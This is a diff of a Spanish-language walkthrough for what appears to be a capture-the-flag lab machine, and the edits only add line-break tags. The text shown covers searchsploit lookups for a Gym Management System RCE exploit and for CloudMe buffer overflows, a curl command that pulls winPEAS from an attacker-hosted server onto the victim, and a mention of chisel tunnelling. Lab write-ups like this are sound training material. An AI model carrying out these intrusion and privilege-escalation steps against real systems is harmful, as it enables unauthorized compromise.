@@ -86,13 +86,13 @@ Copio el script
 searchsploit -m php/webapps/48506.py
 
 →<br>
-  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
-  	URL: https://www.exploit-db.com/exploits/48506
- 	Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
-	Codes: N/A
- Verified: False
-File Type: Python script, ASCII text executable
-Copied to: /home/kali/Desktop/48506.py
+  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution<br>
+  	URL: https://www.exploit-db.com/exploits/48506<br>
+ 	Path: /usr/share/exploitdb/exploits/php/webapps/48506.py<br>
+	Codes: N/A<br>
+ Verified: False<br>
+File Type: Python script, ASCII text executable<br>
+Copied to: /home/kali/Desktop/48506.py<br>
 
 
 Ejecución de exploit:
@@ -127,45 +127,45 @@ https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 
 winPEASx64.exe
 
-Comparto el winPEASx64.exe desde el equipo atacante
-python3 -m http.server 8080
+Comparto el winPEASx64.exe desde el equipo atacante<br>
+python3 -m http.server 8080<br>
 
 
-Descargo winPEASx64.exe en máquina víctima
-curl http://10.10.14.10:8080/winPEASx64.exe -o winPEASx64.exe
+Descargo winPEASx64.exe en máquina víctima<br>
+curl http://10.10.14.10:8080/winPEASx64.exe -o winPEASx64.exe<br>
 
 
-Ejecutamos winPEASx64.exe en la máquina y detectamos:
-“C:\Users\shaun\Downloads\CloudMe_1112.exe” : shaun [AllAccess]
+Ejecutamos winPEASx64.exe en la máquina y detectamos:<br>
+“C:\Users\shaun\Downloads\CloudMe_1112.exe” : shaun [AllAccess]<br>
 
 Encontramos en Google que CloudMe utiliza el puerto 8888
 
-Máquina víctima
-Verifico que CloudMe está ejecutándose en el puerto 8888
-netstat -nat
+Máquina víctima<br>
+Verifico que CloudMe está ejecutándose en el puerto 8888<br>
+netstat -nat<br>
 
 → <br><br>
-localhost:8888
+localhost:8888<br>
 
-Busco vulnerabilidades
-searchsploit CLoudMe
+Busco vulnerabilidades<br>
+searchsploit CLoudMe<br>
 
 →<br>
----------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                      	|  Path
----------------------------------------------------------------------------------------- ---------------------------------
-CloudMe 1.11.2 - Buffer Overflow (PoC)                                              	| windows/remote/48389.py
-CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                     	| windows/local/48499.txt
-CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                     	| windows/local/48840.py
-Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                    	| windows_x86-64/remote/45197.rb
-CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                             	| windows_x86-64/local/45159.py
-CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                      	| windows/remote/44175.rb
-CloudMe Sync 1.11.0 - Local Buffer Overflow                                         	| windows/local/44470.py
-CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                     	| windows/remote/46218.py
-CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                            	| windows_x86-64/remote/46250.py
-CloudMe Sync < 1.11.0 - Buffer Overflow                                             	| windows/remote/44027.py
-CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                          	| windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------------- ---------------------------------
+---------------------------------------------------------------------------------------- ---------------------------------<br>
+ Exploit Title                                                                      	|  Path<br>
+---------------------------------------------------------------------------------------- ---------------------------------<br>
+CloudMe 1.11.2 - Buffer Overflow (PoC)                                              	| windows/remote/48389.py<br>
+CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                     	| windows/local/48499.txt<br>
+CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                     	| windows/local/48840.py<br>
+Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                    	| windows_x86-64/remote/45197.rb<br>
+CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                             	| windows_x86-64/local/45159.py<br>
+CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                      	| windows/remote/44175.rb<br>
+CloudMe Sync 1.11.0 - Local Buffer Overflow                                         	| windows/local/44470.py<br>
+CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                     	| windows/remote/46218.py<br>
+CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                            	| windows_x86-64/remote/46250.py<br>
+CloudMe Sync < 1.11.0 - Buffer Overflow                                             	| windows/remote/44027.py<br>
+CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                          	| windows_x86-64/remote/44784.py<br>
+---------------------------------------------------------------------------------------- ---------------------------------<br>
 
 https://github.com/jpillora/chisel/releases
 
